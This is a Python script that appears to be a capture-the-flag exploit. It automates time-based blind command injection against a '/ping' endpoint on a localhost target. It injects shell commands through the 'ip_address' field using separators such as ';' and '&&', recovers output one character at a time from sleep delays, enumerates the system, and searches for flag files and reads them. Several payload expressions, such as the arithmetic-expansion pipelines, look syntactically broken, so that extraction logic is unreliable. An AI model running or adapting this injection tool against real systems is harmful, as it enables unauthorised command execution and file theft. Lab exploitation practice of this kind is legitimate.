import requests
import time
import string
import urllib.parse

# Configuration
TARGET_URL = "http://127.0.0.1:32817"
PING_ENDPOINT = "/ping"
TIMEOUT_THRESHOLD = 3  # Seconds that indicate successful execution

# Character set for extraction (avoiding problematic characters)
CHARSET = string.ascii_letters + string.digits + "_-.:/ "

def send_payload(payload):
    """Send payload to the ping endpoint and return response time"""
    try:
        # The requests library will automatically encode the form data
        start_time = time.time()
        response = requests.post(
            f"{TARGET_URL}{PING_ENDPOINT}",
            data={"ip_address": payload},
            timeout=15  # Max wait time for each request
        )
        end_time = time.time()
        
        elapsed = end_time - start_time
        return elapsed, response.status_code, response.text
        
    except requests.exceptions.Timeout:
        return 15, 408, "Timeout"
    except Exception as e:
        return 0, 500, str(e)

def test_basic_sleep():
    """Step 1: Confirm the vulnerability is working with a basic sleep test"""
    print("[*] Step 1: Confirming blind command injection vulnerability")
    
    # Test different separators to find one that works
    separators = [";", "&&", "|", "||"]
    working_separator = None
    
    for sep in separators:
        payload = f"127.0.0.1 {sep} sleep 4"
        print(f"[*] Testing payload: {payload}")
        
        elapsed, status, response = send_payload(payload)
        print(f"[*] Response time: {elapsed:.2f} seconds | Status: {status}")
        print(f"[*] Response preview: {response[:150]}")
        print()
        
        if elapsed >= 4:
            print(f"[+] VULNERABILITY CONFIRMED with separator '{sep}'!")
            working_separator = sep
            break
    
    if working_separator:
        return working_separator
    else:
        print("[-] Vulnerability not confirmed with any separator")
        return None

def extract_single_command(command, max_length=30):
    """Extract command output using character-by-character time-based blind injection"""
    print(f"\n[*] Extracting output for: {command}")
    
    result = ""
    position = 1
    consecutive_failures = 0
    max_failures = 3
    
    while position <= max_length and consecutive_failures < max_failures:
        char_found = False
        
        # Test each character in our charset
        for char in CHARSET:
            # Escape special characters that might break the shell command
            if char == "'":
                continue
                
            # Build conditional payload: if character matches, sleep
            # Format: [ "$(cmd | cut -cN-N)" = "X" ] && sleep 5
            # Use different approach to avoid quote nesting issues
            
            test_cmd = f"{command} | cut -c{position}-{position}"
            payload = f"127.0.0.1; [ $(({test_cmd} | wc -c)) -gt 0 ] && [ $(printf '%s' $(({test_cmd})) | od -An -tx1 | tr -d ' ' | head -c2) = $(printf '{char}' | od -An -tx1 | tr -d ' ' | head -c2) ] && sleep 5"
            
            elapsed, status, response = send_payload(payload)
            
            if elapsed >= 5:
                result += char
                print(f"[+] Position {position}: '{char}' -> '{result}'")
                char_found = True
                position += 1
                consecutive_failures = 0
                break
        
        if not char_found:
            # Try checking if we're at the end of output
            check_end_payload = f"127.0.0.1; [ $({command} | wc -c) -lt {position} ] && sleep 3"
            elapsed, status, response = send_payload(check_end_payload)
            
            if elapsed >= 3:
                print(f"[+] End of output reached at position {position}")
                break
            else:
                consecutive_failures += 1
                print(f"[-] No character found at position {position} (failure {consecutive_failures}/{max_failures})")
        
        if consecutive_failures == max_failures:
            print(f"[-] Too many consecutive failures, stopping extraction")
            break
    
    return result.strip()

def enumerate_system():
    """Enumerate system using blind command injection"""
    print("\n" + "="*60)
    print("[*] Starting System Enumeration")
    print("="*60)
    
    findings = {}
    
    # 1. Get current user
    print("\n[*] Testing: whoami")
    findings['whoami'] = extract_single_command("whoami", 15)
    print(f"[+] Current user: '{findings['whoami']}'")
    
    # 2. Get current directory
    print("\n[*] Testing: pwd")
    findings['pwd'] = extract_single_command("pwd", 30)
    print(f"[+] Current directory: '{findings['pwd']}'")
    
    # 3. List root directory contents
    print("\n[*] Testing: ls /")
    root_contents = extract_single_command("ls -1 / | head -15", 150)
    findings['root_ls'] = root_contents
    print(f"[+] Root directory contents:\n{root_contents}")
    
    # 4. Search for flag files
    print("\n[*] Testing: find for flag files")
    flag_files = extract_single_command("find / -name '*flag*' 2>/dev/null | head -5", 200)
    findings['flag_files'] = flag_files
    print(f"[+] Flag files found:\n{flag_files}")
    
    return findings

def read_discovered_file(filepath):
    """Read content from discovered file"""
    print(f"\n[*] Attempting to read: {filepath}")
    
    # Read first 80 characters
    content = extract_single_command(f"cat {filepath}", 80)
    
    if content and len(content.strip()) > 0:
        print(f"[+] File content:\n{content}")
        return content
    else:
        print(f"[-] Could not read file or file is empty")
        return None

def extract_hex_byte_by_byte(command, max_bytes=50):
    """Alternative extraction method using hex byte comparison"""
    print(f"\n[*] Using hex byte extraction for: {command}")
    
    result_bytes = []
    
    for byte_pos in range(1, max_bytes + 1):
        # Check if byte exists
        check_payload = f"127.0.0.1; [ 1 -eq 1 ] && [ $(({command} | wc -c)) -ge {byte_pos} ] && sleep 3"
        elapsed, status, response = send_payload(check_payload)
        
        if elapsed < 3:
            print(f"[+] End of output at byte {byte_pos}")
            break
        
        # Try each hex value (00-FF)
        for hex_val in range(0, 256):
            hex_str = format(hex_val, '02x')
            
            # Get the hex value of the byte at this position
            test_payload = f"127.0.0.1; [ $(printf '%02x' $((echo -n $(({command} | cut -c{byte_pos}-{byte_pos})) | od -An -tx1 | tr -d ' ' | cut -c1-2)) ) = '{hex_str}' ] && sleep 4"
            
            elapsed, status, response = send_payload(test_payload)
            
            if elapsed >= 4:
                # Convert hex to character
                try:
                    char_val = bytes.fromhex(hex_str).decode('utf-8', errors='ignore')
                    result_bytes.append(char_val)
                    print(f"[+] Byte {byte_pos}: {hex_str} ('{char_val}')")
                except:
                    result_bytes.append(f"\\x{hex_str}")
                    print(f"[+] Byte {byte_pos}: {hex_str} (non-printable)")
                break
    
    return "".join(result_bytes)

def main():
    """Main execution"""
    print("="*60)
    print("Blind Command Injection Enumerator")
    print(f"Target: {TARGET_URL}{PING_ENDPOINT}")
    print("Detection: Time-based blind injection")
    print("="*60)
    
    # Step 1: Confirm vulnerability
    separator = test_basic_sleep()
    if not separator:
        print("[-] Vulnerability not confirmed - aborting")
        return
    
    print("\n[+] Vulnerability confirmed! Starting enumeration...")
    time.sleep(1)
    
    # Step 2-4: Enumerate system
    findings = enumerate_system()
    
    # Step 5: Read discovered files
    if findings.get('flag_files') and findings['flag_files'].strip():
        print("\n" + "="*60)
        print("[*] Attempting to read discovered files")
        print("="*60)
        
        # Parse file paths
        file_paths = []
        for line in findings['flag_files'].strip().split('\n'):
            line = line.strip()
            if line and not line.startswith("find:") and not "Permission denied" in line:
                file_paths.append(line)
        
        for filepath in file_paths[:3]:  # Try up to 3 files
            print(f"\n[!] Attempting to read: {filepath}")
            file_content = read_discovered_file(filepath)
            
            if file_content:
                # Check for FLAG pattern
                if "FLAG{" in file_content:
                    flag_start = file_content.find("FLAG{")
                    flag_end = file_content.find("}", flag_start)
                    if flag_end > flag_start:
                        flag = file_content[flag_start:flag_end + 1]
                        print(f"\n{'='*60}")
                        print("╔════════════════════════════════════════════════════════╗")
                        print("║              FLAG SUCCESSFULLY EXTRACTED!              ║")
                        print(f"║  File: {filepath:<40} ║")
                        print(f"║  Flag: {flag:<40} ║")
                        print("╚════════════════════════════════════════════════════════╝")
                        print("="*60)
                        return
                else:
                    print(f"[+] File content retrieved but no FLAG pattern found")
    
    print("\n" + "="*60)
    print("[*] Enumeration Complete - Summary")
    print("="*60)
    print("\nFindings:")
    for key, value in findings.items():
        if value and value.strip():
            print(f"\n{key}:")
            print(value)
        else:
            print(f"\n{key}: (no data)")
    
    print("\n[!] No FLAG found. Flag might be:")
    print("    - In a file with different name pattern")
    print("    - Require different search terms")
    print("    - Need more extensive enumeration")

if __name__ == "__main__":
    main()

